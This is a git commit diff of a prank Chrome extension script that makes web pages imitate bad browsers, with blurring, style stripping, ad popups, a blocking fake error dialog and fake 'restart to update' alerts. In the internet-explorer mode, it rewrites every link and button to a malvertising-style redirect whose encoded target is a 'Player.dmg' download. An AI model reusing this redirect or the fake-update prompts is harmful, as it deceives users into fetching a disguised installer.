88576b507a662fdc190dacf6e6406d9c3a99fd67
robertmay2003 <robertmay2003@gmail.com>
2018-06-26 20:42:45 -0400

    Formatting, Debugging, Improving

--- src/simulate.js
+++ src/simulate.js
@@ -1,13 +1,82 @@
-String.prototype.replaceAll = function(search, replacement) {
+String.prototype.replaceAll = function (search, replacement) {
 	var target = this;
 	return target.replace(new RegExp(search, 'g'), replacement);
 };
 
-function removeAllStyle() {
-	// remove all CSS
-	$(document).find('link[rel=stylesheet]').remove();
-	$(document).find('style').remove();
-}
+$.fn.modeClass = function () {
+	// get most used class in element and its children
+	let all = this.find('*');
+	let arr = [];
+	for (var i = 0; i < all.length; i++) {
+		if (all[i].className.length > 0) {
+			arr = arr.concat(all[i].className.split(' '));
+		}
+	}
+	var count = {}, string, max, most = 0;
+	for (var j = 0; j < arr.length; j += 1) {
+		string = arr[j];
+		count[string] = (count[string] || 0) + 1;
+		if (count[string] > most && string.length > 0) {
+			max = string;
+			most = count[string];
+		}
+	}
+	if (max != null) {
+		return max;
+	} else {
+		return null;
+	}
+};
+
+$.fn.minClass = function () {
+    // get most used class in element and its children
+    let all = this.find('*');
+    let arr = [];
+    for (var i = 0; i < all.length; i++) {
+        if (all[i].className.length > 0) {
+            arr = arr.concat(all[i].className.split(' '));
+        }
+    }
+    var count = {}, string, min, least = Number.MAX_VALUE;
+    for (var j = 0; j < arr.length; j += 1) {
+        string = arr[j];
+        count[string] = (count[string] || 0) + 1;
+        if (count[string] < least && string.length > 0) {
+            min = string;
+            least = count[string];
+        }
+    }
+    if (min != null) {
+        return min;
+    } else {
+        return null;
+    }
+};
+
+$.fn.removeStyle = function () {
+	// remove style from element and all children
+	this.find('*').each(function () {
+		$(this).removeAttributes();
+	});
+};
+
+$.fn.randomChild = function () {
+	// get random child
+	return this.find('*').eq(Math.floor(Math.random() * this.find('*').length))
+};
+
+$.fn.removeAttributes = function() {
+    if (this.length > 1) {
+        this.each(function () {
+           $(this).removeAttributes();
+        });
+    } else {
+        let elem = this[0];
+        while (elem.attributes.length > 0) {
+            elem.removeAttribute(elem.attributes[0].name);
+        }
+    }
+};
 
 function sendAllTo(href) {
 	// send all links and buttons to href
@@ -15,80 +84,7 @@ function sendAllTo(href) {
 	$(document).find('button').attr('onclick', `location.href=${href}`);
 }
 
-function removeStyle(identifier) {
-	let all = $(identifier);
-	var i;
-	for (i = 0; i < all.length; i++) {
-		all = all.add(getChildren($(all[i])));
-	}
-	// all = list of specified elements and their children
-	for (i = 0; i < all.length; i++) {
-		let elem = all[i];
-		while(elem.attributes.length > 0) {
-			elem.removeAttribute(elem.attributes[0].name);
-		}
-	}
-}
-
-function getChildren(area) {
-	let c = $(area).children();
-	var complete = [];
-	for (var i = 0; i < c.length; i++) {
-		complete.push(c[i]);
-		complete = complete.concat(getChildren(c[i]));
-	}
-	return complete;
-}
-
-function mode(strings) {
-	// as result can be bimodal or multi-modal,
-	// the returned result is provided as an array
-	// mode of [3, 5, 4, 4, 1, 1, 2, 3] = [1, 3, 4]
-	var count = {}, i, string, max, most = 0;
-
-	for (i = 0; i < strings.length; i += 1) {
-		string = strings[i];
-		count[string] = (count[string] || 0) + 1;
-		if (count[string] > most) {
-			max = string;
-			most = count[string];
-		}
-	}
-
-	if (max != null) {
-		return max;
-	} else {
-		return null;
-	}
-}
-
-function getModeClass() {
-	let all = getChildren('body');
-	let arr = [];
-	for (var i = 0; i < all.length; i++) {
-		if (all[i].className.length > 0) {
-			arr = arr.concat(all[i].className.split(' '));
-		}
-	}
-	return mode(arr);
-}
-
-function randomClass() {
-	let all = getChildren('body');
-	let arr = [];
-	for (var i = 0; i < all.length; i++) {
-		if (all[i].className.length > 0) {
-			arr = arr.concat(all[i].className.split(' '));
-		}
-	}
-	let ret = arr[Math.floor(Math.random() * arr.length)];
-	while (ret.length === 0) {
-		ret = arr[Math.floor(Math.random() * arr.length)];
-	}
-	return ret;
-}
-
-function allImagesTo(src) {
+function changeImages(src) {
 	if (src === 'download') {
 		$('img').each(function () {
 			$(this).attr('src', randomDownloadButton());
@@ -101,105 +97,130 @@ function allImagesTo(src) {
 }
 
 function randomDownloadButton() {
-	let arr = ['http://www.cleaningpcmalware.com/wp-content/uploads/2016/04/download-button.png',
-		'https://www.janiking.com/wp-content/uploads/2013/05/free-office-cleaning-checklist.png',
-		'http://4.bp.blogspot.com/-MWi6z3T_sdQ/VMzL9g5Il1I/AAAAAAAAAFU/bOIbPhd5xCw/s1600/downloadbut-flashing-side-arrow-animation.gif',
-		'https://i0.wp.com/ludostarmodapk.info/wp-content/uploads/2018/04/Download-app.png'];
-	return arr[Math.floor(Math.random() * arr.length)];
+	let links = ['assets/db1.png',
+		'assets/db2.png',
+		'assets/db3.gif',
+		'assets/db4.png'];
+	return chrome.extension.getURL(links[Math.floor(Math.random() * links.length)]);
 }
 
 function randomAdvertisement() {
-	let arr = ['https://vignette.wikia.nocookie.net/le-miiverse-resource/images/1/1b/CONGRATULATONS_YOU_WON.jpg',
-		'https://i.ebayimg.com/images/g/kyoAAOSwa~hZZoxX/s-l1600.jpg',
-		'https://images-na.ssl-images-amazon.com/images/I/61CAqw8opTL._SY355_.jpg',
-		'https://cdn.shopify.com/s/files/1/1255/9249/files/Bigger_penis_pills_size.jpg',
-		'https://pbs.twimg.com/media/BtaHP5lCQAA7rjO.jpg',
-		'https://cdn2.cdnme.se/cdn/7-2/2207486/images/2010/russian_120987568.png',
-		'http://www.danmccarty70.com/000/4/2/9/15924/userfiles/image/russianbrides.jpg',
-		'http://i0.kym-cdn.com/photos/images/newsfeed/001/275/124/4df.jpg',
-		'https://pbs.twimg.com/media/CTKFF9BUkAABPTN.jpg',
-		'http://i1.kym-cdn.com/photos/images/newsfeed/001/125/168/69f.png'];
-	return arr[Math.floor(Math.random() * arr.length)];
+	let links = [
+		'assets/p1.jpg'
+    ];
+	return chrome.extension.getURL(links[Math.floor(Math.random() * links.length)]);
 }
 
-function blockingPopup() {
-	$('body').css('overflow', 'hidden');
-
-	var popupHolder = $('<div></div>')
-		.attr('style', 'text-align:center;background-color:rgba(0, 0, 0, 0.5);position:fixed;top:0;left:0;z-index:9999;width:100%;height:100%');
-	var popup = $('<img></img>')
-		.attr('src', 'https://s11986.pcdn.co/wp-content/uploads/2007/11/ie-encountered-problem.jpg')
-		.attr('style', 'display:inline-block;margin-top:20px;width:80%')
-	var close = $('<button></button>')
-		.click(function () {
-			$('body').css('overflow', 'scroll');
-			document.body.removeChild(popupHolder);
-			let timeout = (Math.random() * 20 + 20) * 1000;
-			setTimeout(blockingPopup, timeout);
-		})
-		.html('Close')
-		.style('position:absolute;top:0;left:0;')
-	popupHolder.append(popup);
-	popupHolder.append(close);
-	$('body').append(popupHolder);
-}
-
-function nonBlockingPopup() {
-	var popup = $('<img></img>')
-		.attr('src', randomAdvertisement())
-	let body = $('body');
-	let l = Math.random() * body.width();
-	let t = Math.random() * body.height();
-	popup.attr('style', 'width:40%;position:absolute;top:' + t + 'px;left:' + l + 'px;z-index:9999');
-	body.append(popup);
-
-	let timeout = (Math.random() * 20 + 10) * 1000;
-	setTimeout(nonBlockingPopup, timeout);
-}
-
-function updateMessage() {
+function blockingPopup(minTimeout, maxTimeout) {
+    let body = $('body');
 	setTimeout(function () {
+		body.css('overflow', 'hidden');
+		var popupHolder = $('<div id="popupHolder"></div>')
+			.attr('style', 'text-align:center;background-color:rgba(0, 0, 0, 0.5);position:fixed;top:0;left:0;z-index:9999;width:100%;height:100%');
+		var popup = $('<img>')
+			.attr('src', 'https://s11986.pcdn.co/wp-content/uploads/2007/11/ie-encountered-problem.jpg')
+			.attr('style', 'display:inline-block;margin-top:20px;width:80%');
+		var close = $('<button></button>')
+			.click(function () {
+				$('body').css('overflow', 'scroll');
+				popupHolder.remove();
+				blockingPopup(minTimeout, maxTimeout)
+			})
+            .html('Close')
+            .attr('style', 'position:absolute;top:0;left:0;');
+		popupHolder.append(popup);
+		popupHolder.append(close);
+		body.append(popupHolder);
+	}, Math.random() * (maxTimeout - minTimeout) + minTimeout)
+}
+
+function nonBlockingPopup(minTimeout, maxTimeout) {
+    let body = $('body');
+	setTimeout(function () {
+        let l = Math.random() * body.width();
+        let t = Math.random() * body.height();
+
+        var popup = $('<img>')
+            .attr('src', randomAdvertisement())
+            .css({
+                'border-top':'20px solid MediumBlue',
+                'border-radius':'10px',
+                'position':'absolute',
+                'top':t+'px',
+                'left':l+'px',
+                'z-index':'9997',
+                'overflow':'hidden',
+                'width':'300px',
+
+            });
+
+        var close = $('<button></button>')
+            .click(function () {
+                popup.remove();
+                close.remove();
+            })
+            .html('X')
+            .css({
+                'position':'absolute',
+                'top':t+'px',
+                'left':l+'px',
+                'z-index':'9998',
+                'background-color':'red',
+                'font-weight':'bold',
+                'font-family':'Arial, Helvetica, sans-serif',
+                'font-size':'15px',
+                'height':'20px',
+                'width':'40px',
+                'padding-left':'15px',
+                'border-top-left-radius':'10px'
+            });
+        body.append(popup);
+        body.append(close);
+		nonBlockingPopup(minTimeout, maxTimeout);
+	}, Math.random() * (maxTimeout - minTimeout) + minTimeout)
+}
+
+function updateMessage(minTimeout, maxTimeout) {
+	setInterval(function () {
 		let digits = [];
 		for (var i = 0; i < 3; i++) {
 			digits.push(Math.floor(Math.random() * 90 + 10));
 		}
-		let msg = 'This version is out of date!\n\n Restard your computer to update to Opera ' + digits[0] + '.' + digits[1] + '.' + digits[2] + '\nThakn u';
+		let msg = 'This version is out of date!\n\n Restart your computer to update to Opera ' + digits[0] + '.' + digits[1] + '.' + digits[2];
 		alert(msg);
-		updateMessage();
-	}, (Math.floor(Math.random() * 20 + 10) * 1000));
+		updateMessage(minTimeout, maxTimeout)
+	}, Math.random() * (maxTimeout - minTimeout) + minTimeout)
 }
 
-function swapCss (class1, class2) {
-	let all1 = $('.'+class1);
-	let all2 = $('.'+class2);
-
-	var i;
-
-	for (i = 0; i < all1.length; i++) {
-		let element = all1[i];
-		element.classList.remove(class1);
-		element.classList.add(class2);
+function removeStyles(times) {
+    let body = $('body');
+	for (var i = 0; i < times/2; i++) {
+	    if (body.modeClass() != null) {
+            let elem = $('.' + body.modeClass());
+            elem.removeAttributes();
+        }
 	}
-
-	for (i = 0; i < all2.length; i++) {
-		let element = all2[i];
-		element.classList.remove(class2);
-		element.classList.add(class1);
-	}
+    for (i = 0; i < times/2; i++) {
+        if (body.minClass() != null) {
+            let elem = $('.' + body.minClass());
+            elem.removeAttributes();
+        }
+    }
 }
 
-function swapClasses(num) {
-	var pairs = {};
-	var i;
-	for (i = 0; i < num; i++) {
-		let key = randomClass();
-		var value = randomClass();
-		if (key != null && key.length > 0 && value.length > 0) {
-			pairs[key] = value;
-		}
-	}
-	for (var k in pairs) {
-		swapCss(k, pairs[k]);
+function swapClasses(times) {
+	let body = $('body');
+	for (var i = 0; i < times; i++) {
+		let element1 = body.randomChild();
+		element1.addClass('place-holder');
+		let classList1 = element1.attr('class').split(' ');
+		let element2 = body.randomChild();
+		element2.addClass('place-holder');
+		let classList2 = element2.attr('class').split(' ');
+		let class1 = classList1[Math.floor(Math.random() * classList1.length)];
+		let class2 = classList2[Math.floor(Math.random() * classList2.length)];
+		$('.' + class1).addClass(class2);
+		$('.' + class2).addClass(class1);
 	}
 }
 
@@ -207,51 +228,48 @@ function viewSource() {
 	let body = $('body');
 	let html = body.html();
 	let fakeConsole = $("<div></div>")
-		.css({'z-index':'9998',
-			'background-color':'black',
-			'color':'lime',
-			'overflow':'auto',
-			'height':'100%',
-			'width':'400px',
-			'position':'absolute',
-			'top':'0px',
-			'right':'0px',
-			'padding':'10px',
+		.css({
+			'z-index': '9998',
+			'background-color': 'black',
+			'color': 'lime',
+			'overflow': 'auto',
+			'width': '400px',
+			'height': '100%',
+			'position': 'fixed',
+			'top': '0',
+			'right': '0',
+			'bottom': '0',
+			'padding': '10px',
 		});
 	html = html.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
 	fakeConsole.html(html);
 	body.append(fakeConsole);
 }
 
-
 chrome.storage.local.get('browser', function (result) {
 	let browser = result.browser;
 	let body = $('body');
 	if (browser === 'safari') {
-		removeStyle('.'+getModeClass());
-		for (var i = 0; i < 3; i++) {
-			removeStyle('.' + randomClass());
-		}
 		body.css('filter', 'blur(0.4px)');
-		nonBlockingPopup();
+		removeStyles(10);
+		nonBlockingPopup(20000, 50000);
 	} else if (browser === 'opera') {
-		updateMessage();
-		swapClasses(50);
+		updateMessage(40000, 120000);
+		swapClasses(20);
 	} else if (browser === 'firefox') {
 		body.css('filter', 'blur(0.5px)');
-		viewSource();
 		body.find('*').css({
 				'font-family': '\'Courier New\', Courier, monospace',
 				'font-size': '18px',
 				'border': '1px solid blue'
 			}
 		);
-		console.log(body.find('*'));
+		viewSource();
 	} else if (browser === 'internet-explorer') {
 		body.css('filter', 'blur(0.7px)');
-		removeAllStyle();
+		body.removeStyle();
 		sendAllTo('http://www.balanceddisplay.com/ravz6?cid=wC96KQUPJJ275LTE1BQAFP8G&source=bb4f8837-134f-4eb9-ac57-7256b0a78b40&c=68802527-3371-e711-a367-f7801280a94b&s=f7b7c003-5db9-439d-b0c5-de6e1b76dd68&client=chrome&h=ShFARhQDFQsJBQkeAgQbCwJtCwYLBwMIAgwZDgABBgIAARsJAAMJBBMfEFtGGw0IDwYEBgMEBgADFRtXEwkQBA4BBwsMBgYeAQEBCBpcDgUAHlMBAA4aXw4MAQIACgZYDg1bFh0RXkJSGw0bUUBFQwgdGU5AThdWUF9TXFVcU11QR0FfU0sYWlhUGxgTQFUQDFdCVVUYE0NRWxQDBgkPGBNQVkIUA0NLTFFM&x=1&u=aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzE5NTA1MC9CNDVBODcvOEIzNTRDL1BsYXllci5kbWc%2fY2lkPXdDOTZLUVVQSkoyNzVMVEUxQlFBRlA4RyZzb3VyY2U9YmI0Zjg4MzctMTM0Zi00ZWI5LWFjNTctNzI1NmIwYTc4YjQwJmM9Njg4MDI1MjctMzM3MS1lNzExLWEzNjctZjc4MDEyODBhOTRiJnM9ZjdiN2MwMDMtNWRiOS00MzlkLWIwYzUtZGU2ZTFiNzZkZDY4JmNsaWVudD1jaHJvbWU%3d');
-		allImagesTo('download');
-		setTimeout(blockingPopup, (Math.random() * 20 + 10) * 1000);
+		changeImages('download');
+		blockingPopup(60000, 120000);
 	}
 });
